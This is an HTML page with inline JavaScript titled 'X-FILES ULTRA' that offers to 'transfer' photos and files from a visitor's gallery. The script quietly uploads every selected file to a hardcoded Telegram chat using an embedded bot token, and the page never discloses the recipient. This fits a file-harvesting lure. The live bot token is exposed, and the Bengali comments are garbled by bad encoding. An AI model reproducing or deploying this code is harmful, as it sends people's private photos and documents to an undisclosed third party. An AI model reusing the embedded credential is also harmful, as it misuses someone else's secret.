<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GX.Sammim - X-FILES ULTRA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;600;900&display=swap'); 
        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; } 
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; } 
        
        .name-container {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.3);
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            padding: 4px 15px;
            display: inline-block;
            margin-bottom: 8px;
        }
        .owner-tag { 
            background: linear-gradient(90deg, #3b82f6, #fff); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            font-size: 0.9rem; 
            font-weight: 900; 
            letter-spacing: 4px;
        }

        .active-tab { background: #3b82f6 !important; color: #fff !important; box-shadow: 0 0 25px rgba(59, 130, 246, 0.5); } 
        .file-card { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); } 
        ::-webkit-scrollbar { width: 5px; } 
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
        
        /* ‡¶™‡ßç‡¶∞‡¶ó‡ßç‡¶∞‡ßá‡¶∏ ‡¶¨‡¶æ‡¶∞ ‡¶è‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶® */
        .progress-bar { transition: width 0.4s ease; }
    </style>
</head>
<body class="p-4">

<div class="max-w-5xl mx-auto"> 
    <div class="glass p-8 mb-8 flex flex-col md:flex-row justify-between items-center"> 
        <div> 
            <div class="name-container">
                <h2 class="owner-tag uppercase">GX.Sammim</h2>
            </div>
            <h1 class="text-3xl font-black tracking-tighter uppercase italic">X-FILES <span class="text-blue-500">ULTRA</span></h1> 
            <p id="eta-text" class="text-[10px] text-blue-400 font-bold uppercase tracking-widest mt-1">High Speed Transfer Enabled</p> 
        </div> 
        <div class="flex bg-black/50 p-1 rounded-2xl border border-white/10 mt-6 md:mt-0"> 
            <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-8 py-2 rounded-xl text-xs font-black transition-all">PHOTO</button> 
            <button onclick="setType('document')" id="tab-document" class="tab-btn px-8 py-2 rounded-xl text-xs font-black transition-all text-gray-400">FILES</button> 
        </div> 
    </div> 

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8"> 
        <div class="lg:col-span-1"> 
            <label class="glass h-64 flex flex-col items-center justify-center cursor-pointer border-2 border-dashed border-gray-700 hover:border-blue-500 transition-all mb-6 group"> 
                <input type="file" id="fileInput" multiple class="hidden"> 
                <span id="upload-icon" class="text-6xl mb-3 group-hover:scale-110 transition-transform">üñºÔ∏è</span> 
                <p id="upload-label" class="text-[11px] text-gray-400 font-black tracking-[0.2em] uppercase text-center px-4">Tap to open Gallery</p> 
            </label> 

            <button onclick="ignite()" id="sendBtn" class="w-full py-6 bg-white text-black font-black rounded-[30px] hover:bg-blue-600 hover:text-white transition-all active:scale-95 shadow-2xl uppercase tracking-[0.3em]">Ignite Transfer</button> 
            
            <div id="status-box" class="mt-4 hidden p-4 glass rounded-2xl border-blue-500/30">
                <p id="status-text" class="text-[10px] font-bold text-blue-400 uppercase mb-2">Transferring: 0%</p>
                <div class="w-full bg-white/10 h-1 rounded-full overflow-hidden">
                    <div id="progress-fill" class="progress-bar bg-blue-500 h-full w-0"></div>
                </div>
            </div>
        </div> 

        <div class="lg:col-span-2 glass p-6 min-h-[450px]"> 
            <div class="flex justify-between items-center mb-8 px-2"> 
                <div class="flex flex-col"> 
                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Queue</span> 
                    <span id="q-count" class="text-blue-500 font-black text-4xl">0</span> 
                </div> 
                <div class="flex flex-col items-end"> 
                    <span class="text-[10px] font-black text-gray-500 tracking-widest uppercase mb-1">Sent Successfully</span> 
                    <span id="s-count" class="text-green-500 font-black text-4xl">0</span> 
                </div> 
            </div> 
            <div id="preview-grid" class="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 overflow-y-auto max-h-[500px] pr-2"> </div> 
        </div> 
    </div> 
</div> 

<script> 
const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4"; 
const CHAT_ID = "5923885908"; 
let queue = []; 
let currentType = 'photo'; 

// ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü
function setType(type) { 
    currentType = type; 
    document.querySelectorAll('.tab-btn').forEach(b => { 
        b.classList.remove('active-tab', 'text-white'); 
        b.classList.add('text-gray-400'); 
    }); 
    document.getElementById(`tab-${type}`).classList.add('active-tab'); 
    document.getElementById('upload-icon').innerText = type === 'photo' ? 'üñºÔ∏è' : 'üìÇ'; 
    document.getElementById('upload-label').innerText = type === 'photo' ? 'Open Gallery' : 'Open Files';
    document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*"; 
} 

document.getElementById('fileInput').onchange = (e) => { 
    const files = Array.from(e.target.files);
    queue = [...queue, ...files]; 
    render(); 
    e.target.value = ""; 
}; 

function render() { 
    const grid = document.getElementById('preview-grid'); 
    grid.innerHTML = ""; 
    document.getElementById('q-count').innerText = queue.length; 
    queue.forEach((f, i) => { 
        const div = document.createElement('div'); 
        div.className = "relative aspect-square rounded-2xl overflow-hidden file-card bg-white/5 flex items-center justify-center"; 
        if (f.type.startsWith('image/')) { 
            div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
        } else { 
            div.innerHTML = `<div class="p-2 text-center text-[10px] font-bold text-gray-400 break-all uppercase">${f.name.split('.').pop()}</div>`; 
        } 
        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-1 right-1 bg-red-600/90 w-5 h-5 rounded-full text-[10px] flex items-center justify-center">‚úï</button>`; 
        grid.appendChild(div); 
    }); 
} 

function remove(i) { queue.splice(i, 1); render(); } 

async function sendFile(file) {
    // ‡¶¨‡ßú ‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶∏‡¶¨ ‡¶∏‡¶Æ‡ßü ‡¶°‡¶ï‡ßÅ‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶Æ‡ßã‡¶° ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶≠‡¶æ‡¶≤‡ßã
    const method = (currentType === 'photo' && file.size < 10*1024*1024) ? 'sendPhoto' : 'sendDocument';
    const field = method === 'sendPhoto' ? 'photo' : 'document';
    
    const fd = new FormData(); 
    fd.append("chat_id", CHAT_ID); 
    fd.append(field, file); 

    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
            method: 'POST',
            body: fd
        });
        return response.ok;
    } catch (err) {
        return false;
    }
}

async function ignite() { 
    if(!queue.length) return; 

    const btn = document.getElementById('sendBtn'); 
    const sCountDisp = document.getElementById('s-count'); 
    const qCountDisp = document.getElementById('q-count'); 
    const statusBox = document.getElementById('status-box');
    const progressFill = document.getElementById('progress-fill');
    const statusText = document.getElementById('status-text');

    btn.disabled = true; 
    btn.innerText = "‚ö° TRANSMITTING..."; 
    statusBox.classList.remove('hidden');

    let sent = 0; 
    const total = queue.length; 
    const batchSize = 2; // ‡¶¨‡ßú ‡¶´‡¶æ‡¶á‡¶≤‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶∏‡¶æ‡¶•‡ßá ‡ß®‡¶ü‡¶ø‡¶∞ ‡¶¨‡ßá‡¶∂‡¶ø ‡¶®‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶á ‡¶≠‡¶æ‡¶≤‡ßã

    for (let i = 0; i < queue.length; i += batchSize) {
        const batch = queue.slice(i, i + batchSize);
        await Promise.all(batch.map(async (file) => {
            const success = await sendFile(file);
            if(success) {
                sent++;
                // ‡¶∞‡¶ø‡ßü‡ßá‡¶≤ ‡¶ü‡¶æ‡¶á‡¶Æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü
                sCountDisp.innerText = sent;
                qCountDisp.innerText = total - sent;
                
                // ‡¶™‡ßç‡¶∞‡¶ó‡ßç‡¶∞‡ßá‡¶∏ ‡¶¨‡¶æ‡¶∞ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü
                const percent = Math.round((sent / total) * 100);
                progressFill.style.width = percent + "%";
                statusText.innerText = `Transferring: ${percent}% (${sent}/${total})`;
            }
        }));
    }

    btn.innerText = "MISSION COMPLETED"; 
    btn.style.background = "#10b981";
    statusText.innerText = "ALL FILES TRANSMITTED";
    
    setTimeout(() => { 
        location.reload(); 
    }, 3000); 
} 
// ‡¶°‡¶ø‡¶´‡¶≤‡ßç‡¶ü ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
setType('photo');
</script>
</body>
</html>
